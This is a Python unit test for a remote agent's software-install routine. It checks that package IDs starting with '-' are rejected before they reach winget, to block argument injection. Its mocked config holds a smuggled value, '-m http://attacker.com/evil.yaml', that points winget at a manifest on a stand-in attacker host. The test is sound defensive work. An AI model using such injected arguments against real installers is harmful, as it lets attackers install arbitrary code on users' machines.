import sys
import os
import unittest
from unittest.mock import MagicMock, patch, mock_open

# Add src to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

# Mock dependencies to prevent import errors and side effects
sys.modules["firebase_admin"] = MagicMock()
sys.modules["firebase_admin.credentials"] = MagicMock()
sys.modules["firebase_admin.firestore"] = MagicMock()
sys.modules["starlette.concurrency"] = MagicMock()
sys.modules["dotenv"] = MagicMock()
sys.modules["uvicorn"] = MagicMock()
sys.modules["fastapi"] = MagicMock()
sys.modules["fastapi.responses"] = MagicMock()

class TestRemoteAgentWingetInjection(unittest.TestCase):
    def setUp(self):
        # Force reload of remote_agent to apply fresh mocks if needed
        if "remote_agent" in sys.modules:
            del sys.modules["remote_agent"]
        if "src.remote_agent" in sys.modules:
            del sys.modules["src.remote_agent"]

        # Patch os.environ to avoid KeyErrors or unwanted config loading
        self.env_patcher = patch.dict(os.environ, {
            "REMOTE_ACCESS_TOKEN": "test_token",
            "LOCAL_WORKSPACE_ROOT": "/tmp/workspace"
        })
        self.env_patcher.start()

        import remote_agent
        self.remote_agent = remote_agent

    def tearDown(self):
        self.env_patcher.stop()

    @patch("subprocess.run")
    @patch("builtins.open", new_callable=mock_open, read_data='{"software": ["-m http://attacker.com/evil.yaml", "legit-app"]}')
    @patch("json.load")
    @patch("os.path.exists")
    def test_check_install_software_injection(self, mock_exists, mock_json_load, mock_file, mock_run):
        """Test that malicious IDs starting with '-' are REJECTED (Vulnerability Fixed)."""

        # Setup mocks
        mock_exists.return_value = True
        mock_json_load.return_value = {"software": ["-m http://attacker.com/evil.yaml", "legit-app"]}

        # Mock winget list to return "No installed package found" so it tries to install
        mock_run.return_value.stdout = "No installed package found"

        # Call the function
        self.remote_agent.check_install_software("/tmp/workspace/project1")

        # Analyze calls
        malicious_id_passed = False
        legit_app_passed = False

        for call in mock_run.call_args_list:
            args, _ = call
            cmd_list = args[0]
            # cmd_list is like ['winget', 'list', '-e', '--id', '-m http://...']
            if "-m http://attacker.com/evil.yaml" in cmd_list:
                malicious_id_passed = True
            if "legit-app" in cmd_list:
                legit_app_passed = True

        # Verify fix
        if malicious_id_passed:
             self.fail("Fix failed: The malicious ID was still passed to subprocess!")

        # Verify legitimate apps still work
        if not legit_app_passed:
            self.fail("Regression: Legitimate app ID was not processed!")

if __name__ == '__main__':
    unittest.main()
